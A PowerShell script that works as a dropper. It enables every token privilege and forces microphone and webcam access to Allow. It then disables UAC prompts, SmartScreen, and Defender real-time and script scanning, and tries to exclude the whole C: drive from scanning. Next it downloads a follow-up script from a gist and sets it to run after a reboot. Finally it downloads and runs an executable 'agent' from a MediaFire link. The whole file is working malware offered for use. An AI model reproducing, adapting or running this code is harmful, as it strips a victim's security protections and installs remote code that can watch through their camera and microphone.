# Check for Administrator rights
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ERROR: Please run this script as Administrator!" -ForegroundColor Red
    exit
}

# === SPEED FIX ===
$ProgressPreference = 'SilentlyContinue'

# ==========================================
# BLOCK 1: AGGRESSIVE PREPARATION
# ==========================================
Write-Host "Initializing Revolution..." -ForegroundColor Cyan

# 1.1 Privilege Escalation
Write-Host "Escalating Privileges..." -ForegroundColor Cyan
$Definition = @"
using System;
using System.Runtime.InteropServices;

public class PrivilegeManager {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public long Luid;
        public uint Attributes;
    }
}
"@
Add-Type -TypeDefinition $Definition -ErrorAction SilentlyContinue

$token = [IntPtr]::Zero
if ([PrivilegeManager]::OpenProcessToken([System.Diagnostics.Process]::GetCurrentProcess().Handle, 0x0020, [ref]$token)) {
    $privileges = @(
        "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", 
        "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", 
        "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", 
        "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", 
        "SeLockMemoryPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", 
        "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", 
        "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege", 
        "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", 
        "SeUndockPrivilege"
    )

    foreach ($priv in $privileges) {
        $luid = 0
        if ([PrivilegeManager]::LookupPrivilegeValue($null, $priv, [ref]$luid)) {
            $tp = New-Object PrivilegeManager+TOKEN_PRIVILEGES
            $tp.PrivilegeCount = 1
            $tp.Luid = $luid
            $tp.Attributes = 0x00000002 # SE_PRIVILEGE_ENABLED
            [void][PrivilegeManager]::AdjustTokenPrivileges($token, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
        }
    }
}
Set-ExecutionPolicy Bypass -Scope Process -Force
if ($PSCommandPath) {
    Unblock-File -Path $PSCommandPath -ErrorAction SilentlyContinue
}

# 1.1.5 Enable Media Permissions (Mic/Cam)
Write-Host "Forcing Media Permissions (Mic/Cam)..." -ForegroundColor Cyan
$CapPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore"
$UserCapPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore"
foreach ($cap in @("microphone", "webcam", "camera")) {
    # System-wide Allow
    $key = "$CapPath\$cap"
    if (Test-Path $key) {
        Set-ItemProperty -Path $key -Name "Value" -Value "Allow" -Type String -Force -ErrorAction SilentlyContinue
    }
    # User specific Allow
    $ukey = "$UserCapPath\$cap"
    if (Test-Path $ukey) {
        Set-ItemProperty -Path $ukey -Name "Value" -Value "Allow" -Type String -Force -ErrorAction SilentlyContinue
    }
}


# 1.2 Disable UAC Prompts
Write-Host "Silencing UAC..." -ForegroundColor Cyan
$UACKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $UACKey -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path $UACKey -Name "ConsentPromptBehaviorUser" -Value 0 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path $UACKey -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue

# 1.3 Add Exclusion
try {
    Write-Host "Attempting C:\ Exclusion..." -ForegroundColor Cyan
    Add-MpPreference -ExclusionPath "C:\" -ErrorAction Stop
} catch {
    Write-Host "Exclusion skipped (TP active). Will retry later." -ForegroundColor DarkGray
}

# 1.4 Disable SmartScreen
Write-Host "Disabling SmartScreen..." -ForegroundColor Yellow
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Force -Type DWord
# Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Edge" -Name "SmartScreenEnabled" -Value 0 -Force -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -Type DWord

# 1.5 Cleanup Temp Folders
Write-Host "Cleaning Temp folders..." -ForegroundColor Cyan
$TempPaths = @($env:TEMP, "$env:SystemRoot\Temp")
foreach ($Path in $TempPaths) {
    Get-ChildItem -Path $Path -Recurse -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
}

# ==========================================
# BLOCK 2: TAMPER PROTECTION BARRIER
# ==========================================
$PrepScriptPath = "$env:ProgramData\RevolutionPrep.ps1"
# [USER] Links needed here!
$PrepUrl = "https://gist.github.com/vthiep2412/7da0d44123b5b469b486827a8ea402ab/raw/6739cc9f30719758db6d0dee16b42825c17f84d1/gistfile1.txt" 
$PayloadUrl = "https://download941.mediafire.com/z514so34f92gvj_K6BuaBZsCs5hYWmLU2J93JYEuJ7YH1Fl7skCq4YFhj6tNd9bX6KeEkpAMU3PGA2hsI6JB6TgoMZcdd6gL51gY_JmiUoGTBY0nZ_1b7Kc8vpkas2LmZgQurVYt__kosnYPhXiKsXQhIcn7KrnTmsxZgw3IXLjE/20v5dhm5fp1z6ir/MyDeskSetup.exe" # <--- FAST PATH Payload

while ($true) {
    $Status = Get-MpComputerStatus
    if ($Status.IsTamperProtected -eq $false) {
        Write-Host "Tamper Protection is OFF. Proceeding to Fast Path..." -ForegroundColor Green
        break
    }

    Write-Host "`n[!] TAMPER PROTECTION IS ON [!]" -ForegroundColor Red
    Write-Host "[P] Proceed: Setup Persistence & Reboot (Long Path)"
    Write-Host "[R] Retry: I manually disabled Tamper Protection"
    
    $Choice = Read-Host "Choose P or R"
    if ($Choice -eq 'P' -or $Choice -eq 'p') {
        Write-Host "Initializing Long Path..." -ForegroundColor Yellow
        
        # Download the Preparation Script from the User's Link
        # CRITICAL: Ensure $PrepUrl points to the UPDATED revolutionplan2.ps1
        Write-Host "Downloading Prep Script from: $PrepUrl"
        try {
            Invoke-WebRequest -Uri $PrepUrl -OutFile $PrepScriptPath -UseBasicParsing -ErrorAction Stop
            Unblock-File -Path $PrepScriptPath -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "RevolutionPrep" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Maximized -File `"$PrepScriptPath`"" -Force
            
            Write-Host "Rebooting..." -ForegroundColor Green
            Start-Sleep -Seconds 3
            Restart-Computer -Force
            exit
        } catch {
             Write-Host "[!] Prep Failed: $($_.Exception.Message)" -ForegroundColor Red
             exit
        }
    }
    elseif ($Choice -eq 'R' -or $Choice -eq 'r') {
        Write-Host "Retrying..."
        # Loop continues
    }
}

# ==========================================
# BLOCK 3: THE REVOLUTION (FAST PATH)
# ==========================================
# If we are here, TP is OFF. We run the payload NOW.
Write-Host "`nStarting Final Phase (Fast Path)..." -ForegroundColor Magenta

# 3.1 Disable Real-time
Write-Host "Killing Defender..." -ForegroundColor Yellow
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
try { Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue } catch {}

# 3.2 Payload Execution (FAST PATH)
$destFolder = $env:TEMP
$SetupDest = "$env:TEMP\MyDeskSetup.exe"

Write-Host "Downloading Payload..." -ForegroundColor Cyan
if ($PayloadUrl -match "YOUR_MEDIAFIRE") {
    Write-Host "[!] ERROR: Update \$PayloadUrl in Script 1!" -ForegroundColor Red
} else {
    try {
        Invoke-WebRequest -Uri $PayloadUrl -OutFile $SetupDest -UseBasicParsing
        Unblock-File -Path $SetupDest -ErrorAction SilentlyContinue
        
        if (Test-Path $SetupDest) {
             Write-Host "Installing Agent..." -ForegroundColor Green
             Start-Process -FilePath $SetupDest -Wait
             Write-Host "Agent Installed!" -ForegroundColor Green
        }
    } catch {
        Write-Host "[!] Download Failed!" -ForegroundColor Red
    }
}
Write-Host "Revolution Complete." -ForegroundColor Magenta
